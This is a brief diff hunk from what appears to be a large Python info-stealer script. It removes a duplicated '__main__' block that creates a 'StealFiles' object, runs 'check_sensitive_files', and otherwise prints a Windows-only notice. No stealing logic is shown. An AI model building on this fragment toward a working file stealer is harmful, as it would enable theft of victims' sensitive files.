@@ -3129,7 +3129,3 @@ if __name__ == '__main__':
         asyncio.run(files.check_sensitive_files())
     else:
         print("run only on windows operating system")
-        files = StealFiles()
-        asyncio.run(files.check_sensitive_files())
-    else:
-        print("run only on windows operating system")
